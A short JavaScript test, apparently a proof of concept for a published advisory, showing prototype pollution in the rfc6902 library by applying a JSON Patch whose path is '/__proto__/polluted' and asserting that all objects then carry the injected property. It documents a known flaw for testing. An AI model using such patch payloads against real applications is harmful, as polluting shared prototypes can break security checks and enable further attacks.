//https://security.snyk.io/vuln/SNYK-JS-RFC6902-1053318
test("prototype pollution in rfc6902", () => {
  expect({}.polluted).toBe(undefined);
  var rfc6902 = require("rfc6902");
  var obj = {};
  rfc6902.applyPatch(obj, [
    { op: "add", path: "/__proto__/polluted", value: "yes" },
  ]);
  expect({}.polluted).toBe("yes");
});
